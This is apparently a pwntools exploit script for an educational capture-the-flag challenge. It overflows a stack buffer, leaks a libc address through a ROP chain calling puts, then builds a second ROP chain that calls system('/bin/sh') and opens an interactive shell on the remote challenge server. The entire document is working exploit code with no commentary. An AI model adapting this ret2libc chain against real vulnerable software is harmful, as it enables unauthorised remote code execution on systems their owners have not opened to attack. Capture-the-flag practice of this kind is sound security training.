from pwn import *

context.arch = 'amd64'
l = ELF('./libc.so')
conn = remote('edu-ctf.csie.org', 10175)

pop_rdi = 0x400733

puts_plt = 0x400520
gets_plt = 0x400530

libc_start_main = 0x600ff0
main = 0x400698

payload = flat(
    'a' * 0x38,
    pop_rdi,
    libc_start_main,
    puts_plt,
    main
)

conn.sendlineafter(':D', payload)

conn.recvline()

libc_start_main_offset = 0x21ab0
libc_base = u64(conn.recv(6) + '\0\0') - libc_start_main_offset

system_offset = 0x4f440
libc_system = libc_base + system_offset
print(hex(l.search('/bin/sh').next()))
bin_sh = libc_base + 0x1b3e9a

ret = 0x400506

payload = flat(
    'a' * 0x38,
    ret,
    pop_rdi,
    bin_sh,
    libc_system
)

conn.sendlineafter(':D', payload)
conn.interactive()
